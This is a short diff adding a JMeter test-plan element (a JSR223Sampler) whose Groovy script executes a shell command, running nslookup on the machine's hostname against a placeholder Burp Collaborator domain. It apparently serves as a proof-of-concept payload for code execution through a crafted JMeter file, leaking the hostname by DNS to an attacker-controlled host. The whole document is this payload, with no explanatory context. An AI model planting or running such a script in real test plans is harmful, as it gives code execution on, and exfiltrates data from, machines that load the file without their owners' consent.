@@ -1,0 +1,6 @@
+<JSR223Sampler guiclass="TestBeanGUI" testclass="JSR223Sampler" testname="Test" enabled="true">
+  <stringProp name="scriptLanguage">groovy</stringProp>
+  <stringProp name="script">
+"nslookup $(hostname).YOUR_BURP_COLLABORATOR".execute()
+  </stringProp>
+</JSR223Sampler>
